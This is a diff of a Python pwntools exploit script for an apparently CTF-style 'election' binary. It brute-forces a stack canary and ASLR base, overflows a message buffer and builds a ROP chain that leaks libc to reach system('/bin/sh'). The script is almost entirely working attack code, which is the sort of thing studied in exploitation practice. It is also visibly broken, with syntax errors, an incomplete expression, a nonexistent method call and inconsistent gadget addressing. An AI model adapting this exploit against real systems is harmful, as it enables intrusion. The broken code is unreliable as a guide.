@@ -10,7 +10,6 @@ elf = ELF('./election')
 # some token array
 token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
 
-# readelf for memprotect
 offset_binsh = next(libc.search('/bin/sh'))
 offset_system = libc.symbols['system']
 offset_puts = elf.symbols['puts']
@@ -21,7 +20,6 @@ print('offset_puts --> ', hex(offset_puts))
 # accumulate vote for enough space to write buffer
 angel_vote = 0
 def vote(total_vote):
-    # in voting function
     global angel_vote
     for cnt_vote in xrange(0, total_vote):
         r.sendlineafter('>', '1')
@@ -33,8 +31,11 @@ def vote(total_vote):
 
     r.sendlineafter('>', '3')
 
-# write buffer to leak canary info
-def buf_canary(p):
+def hack_vote_ret(canary):
+    # 0x00000000000011a0 : pop r14 ; pop r15 ; ret: to clear 2 variables in main function
+    p = ''
+    pop_r14r15_ret = base + 0x11a0
+
     r.sendlineafter('>', '2')
 
     # The more votes.... say!
@@ -43,14 +44,14 @@ def buf_canary(p):
     # try overwrite canary, msg[0xe0] and 8 bytes for 2 integers
     # To Angelboy:
     r.recv()
-    r.sendline('A' * 0xe8 + p)
+    #         (|msg 0xe0        | canary       | n idx      |   rbp         |   ret            |)
+    r.sendline('\x00' * 0xe0 + p64(canary) + '\x00' * 0x10 + '\x00' * 0x08 + p64(pop_r14r15_ret))
 
     # Done!
-
     # quit voting --> SIGABRT occurred
     pause()
     r.sendlineafter('>', '3')
-    print(r.recv())
+    print('finished hacking vote --> 'r.recv())
 
 def hack_canary_ASLR():
     canary = ''
@@ -109,15 +110,13 @@ def hack_canary_ASLR():
     return u64(canary), u64(aslr)
 
 # craft the rop for libc base
-def rop_libc_base(base, canary):
+def rop_libc_base(canary, base):
     p = ''
+    # 0x00000000000011a3 : pop rdi ; ret: to get rdi
+    pop_rdi = 0x11a3
 
-    # 0x00000000000011a3 : pop rdi ; ret
-    pop_rdi = base + 0x00000000000011a3
-    p += p64(pop_rdi)
-
-    # 0x201fe0
-    libc_start_main = base + 0x201
+    # 0x201fe0 <__libc_start_main@GLIBC_2.2.5>, assign this to rdi
+    libc_start_main = base + 0x201fe0
     p += p64(libc_start_main)
 
     # puts(libc_start_main)
@@ -127,9 +126,12 @@ def rop_libc_base(base, canary):
     print('ROP for libc_base --> ', p)
     return p
 
-def main():
-    # find some required offset
+def write_to_token(p):
+    r.sendlineafter('>', '2')
+    r.sendlineafter('Token: ', '\x00' * )
+    return 0
 
+def main():
     # brute force finding canary, and some ASLR-shit
     canary, base = hack_canary_ASLR()
 
@@ -146,6 +148,7 @@ def main():
             vote(5)
 
     # check vote result
+    '''
     r.sendlineafter('>', '2')
     r.sendlineafter('token: ', token[26])
     r.sendlineafter('>', '1')
@@ -158,7 +161,23 @@ def main():
     r.recvline()
 
     buf_canary(rop_libc_base(canary, base))
+    '''
     r.sendlineafter('>', '3')
+    r.sendlineafter('>', '2')
+    r.sendlineafter('token: ', '\x00' * 0xb8)
+    print('finished clearing token')
+
+    # write the ROP of leaking libc in token
+    p1 = rop_libc_base(canary, base)
+    r.sendlineafter('>', '2')
+    r.sendlineafter('token: ', p1)
+
+    print('finished writing ROP of leaking libc in token')
+
+    r.sendlineafter('>', '1')
+    r.sendthen('Token: ', p1)
+
+    hack_vote_ret(canary)
 
 main()
 r.sendlineafter('>', '3')
